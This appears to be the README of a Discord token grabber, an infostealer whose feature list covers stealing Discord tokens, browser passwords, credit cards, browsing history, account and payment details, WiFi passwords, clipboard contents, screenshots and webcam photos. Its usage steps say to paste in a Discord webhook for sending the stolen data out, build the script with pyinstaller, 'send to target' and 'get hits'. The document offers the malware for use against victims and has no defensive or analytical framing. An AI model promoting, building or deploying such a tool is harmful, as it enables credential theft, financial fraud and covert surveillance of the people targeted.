### Features

- grabs discord tokens from discord and all major browsers
- steals browser data:
  - passwords
  - credit Cards
  - browsing History
- discord account info:
  - username, ID, creation date
  - nitro type (basic / boost), expiration date and available boosts
  - all badges
  - avatar decorations count
  - MFA status, Email, Phone, Locale, Verified status
  - all guilds with member count
  - admin guilds + vanity URLs
  - payment methods
- system information:
  - IP address
  - Computer name and username
- Extra:
  - Clipboard content
  - Saved WiFi passwords
  - Desktop screenshot
  - Webcam photo


### How to Use
1. Put your Discord webhook URL in the script where it says `WEBHOOK = "yourwebhookhere"`
2. build with pyinstaller
3. send to target
4. get hits
